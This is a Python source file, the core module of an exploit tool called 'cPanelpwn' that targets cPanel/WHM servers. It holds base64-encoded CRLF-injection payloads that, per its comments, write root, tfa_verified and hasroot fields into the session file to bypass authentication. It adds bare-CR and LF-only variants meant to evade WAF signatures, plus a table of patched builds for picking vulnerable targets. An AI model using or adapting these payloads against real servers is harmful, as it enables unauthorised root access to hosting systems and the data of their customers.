"""Módulo cPanelpwn: core."""

import re
from typing import NamedTuple, Optional, Dict, List, Set
from urllib.parse import urlsplit

# ══════════════════════════════════════════════════════════════
#  CONTEXTO DE SCAN
# ══════════════════════════════════════════════════════════════
class ScanCtx(NamedTuple):
    scheme:       str
    host:         str
    port:         int
    canonical:    str
    session_base: str
    token:        str
    timeout:      int
    waf:          str  = ""
    bypass_hdrs:  dict = {}

# ══════════════════════════════════════════════════════════════
#  PAYLOAD CRLF
# ══════════════════════════════════════════════════════════════
# Decodes to:
#   root:x\r\n
#   successful_internal_auth_with_timestamp=9999999999\r\n
#   user=root\r\n
#   tfa_verified=1\r\n
#   hasroot=1
# Campos escritos diretamente no arquivo de sessão, saltando o check de auth.
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)
# Variante bare-CR (só \r — aceitada por algumas versões de cpsrvd / confunde firmas WAF)
PAYLOAD_B64_CR = (
    "cm9vdDp4DXN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD05OTk5"
    "OTk5OTk5DXVzZXI9cm9vdA10ZmFfdmVyaWZpZWQ9MQ1oYXNyb290PTE="
)
# Variante só-LF (só \n — alguns proxies tiram \r antes de reenviar)
PAYLOAD_B64_LF = (
    "cm9vdDp4CnN1Y2Nlc3NmdWxfaW50ZXJuYWxfYXV0aF93aXRoX3RpbWVzdGFtcD05OTk5"
    "OTk5OTk5CnVzZXI9cm9vdAp0ZmFfdmVyaWZpZWQ9MQpoYXNyb290PTE="
)

# (patched_patch, patched_build) — build mínima dessa rama que está corrigida
PATCHED: Dict[str, tuple] = {
    "110": (0, 97),
    "118": (0, 63),
    "126": (0, 54),
    "132": (0, 29),
    "134": (0, 20),
    "136": (0,  5),
}

# ══════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════
#  PARSEO DE ALVOS
# ══════════════════════════════════════════════════════════════
def parse_target(url: str) -> tuple:
    if "://" not in url:
        url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    return u.scheme or "https", u.hostname or url, u.port or 2087

def _has_explicit_port(raw: str) -> bool:
    """Devolver True se o usuário incluiu explicitamente um número de porta no alvo."""
    s = raw
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.split("/")[0]          # retirar caminho
    if s.startswith("["):        # IPv6: [::1]:2087
        return "]:" in s
    return ":" in s

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def is_version_patched(version: str) -> Optional[bool]:
    m = re.match(r"11\.(\d+)\.(\d+)\.(\d+)", version)
    if not m:
        return None
    branch, patch, build = m.group(1), int(m.group(2)), int(m.group(3))
    if branch in PATCHED:
        patched_patch, patched_build = PATCHED[branch]
        return (patch, build) >= (patched_patch, patched_build)
    return None
